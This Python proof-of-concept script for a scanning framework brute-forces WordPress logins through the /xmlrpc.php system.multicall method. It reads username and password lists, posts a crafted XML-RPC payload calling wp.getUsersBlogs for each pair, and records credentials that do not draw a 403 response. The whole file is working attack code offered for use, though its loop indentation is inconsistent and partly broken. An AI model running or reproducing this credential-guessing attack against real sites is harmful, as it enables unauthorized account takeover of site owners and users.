#!/usr/bin/env python
# coding=utf-8

import urllib
import urllib2
import string
import re

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0148',
            'name': 'WordPress <=4.3.1 /xmlrpc.php 爆破漏洞 Exploit',
            'author': 'sunrise',
            'create_date': '2015-10-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['4.3.1'],
            'type': 'Other',
            'tag': ['WordPress 漏洞', '暴力破解', '/xmlrpc.php', 'php'],
            'desc': 'WordPress /xmlrpc.php，可以被利用进行爆破',
            'references': ['http://bluereader.org/article/90306640',
            ],
        },
    }

    @classmethod
    def exploit(cls, args):
        n_file = open('J:/name.txt','r')
        p_file = open('J:/password.txt','r')
        l_name = n_file.readlines()
        l_passwd = p_file.readlines()       
        for name in l_name: 
                for passwd in l_passwd:
                    name = name.strip('\n')
                    passwd = passwd.strip('\n')
                    payload = '<methodCall>\
                                <methodName>system.multicall</methodName>\
                    <params><param>\
                    <value><array><data>\
                    <value><struct>\
                    <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>\
                    <member><name>params</name><value><array><data>\
                    <value><string>%s</string></value>\
                    <value><string>%s</string></value>\
                    </data></array></value></member>\
                    </struct></value>\
                    </data></array></value>\
                    </param></params>\
                    </methodCall>'  % (name,passwd)          
                    verify_url = args['options']['target']+'/xmlrpc.php'            
            req = urllib2.Request(verify_url,payload)       
            if args['options']['verbose']:
                        print '[*] Request URL: ' + verify_url          
            content = urllib2.urlopen(req).read()       
            m = re.search(r'<int>403</int>',content)
            if not m:
                args['success'] = True
                args['poc_ret'][name] = passwd
                break                   
        return args
    
    verify = exploit

if __name__ == '__main__':

    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())